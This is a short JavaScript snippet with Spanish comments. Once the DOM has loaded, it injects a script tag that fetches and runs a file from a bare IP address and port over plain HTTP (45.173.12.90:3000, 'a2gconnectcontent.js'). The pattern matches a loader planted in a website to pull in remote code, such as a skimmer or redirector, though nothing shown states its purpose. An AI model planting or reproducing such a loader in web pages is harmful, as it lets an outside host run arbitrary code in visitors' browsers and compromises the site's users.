// Esperar a que el DOM esté completamente cargado
document.addEventListener('DOMContentLoaded', function() {
    // Crear un nuevo elemento de script
    var script = document.createElement('script');
    script.src = 'http://45.173.12.90:3000/js/a2gconnectcontent.js';
    
    // Añadir el elemento de script al cuerpo
    document.body.appendChild(script);
  });